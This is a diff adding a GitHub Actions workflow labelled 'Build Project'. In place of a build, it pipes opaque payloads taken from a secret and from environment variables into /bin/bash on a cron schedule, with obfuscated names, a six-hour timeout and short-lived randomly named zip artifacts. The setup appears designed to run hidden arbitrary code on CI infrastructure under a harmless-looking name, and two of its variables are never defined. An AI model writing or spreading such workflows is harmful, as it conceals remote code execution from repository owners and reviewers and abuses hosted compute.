@@ -1,0 +1,29 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '4 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          a05: ${{ secrets.a05 }}
+        run: |
+          printf '%s' "$a05" | jq -r .nup41 | /bin/bash
+          printf '%s' "$m78253" | jq -r .vlj40 | /bin/bash
+          printf '%s' "$nr9" | jq -r .iwqhk35626 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: jyO7CakJ
+          path: "*.zip"
+          retention-days: 1
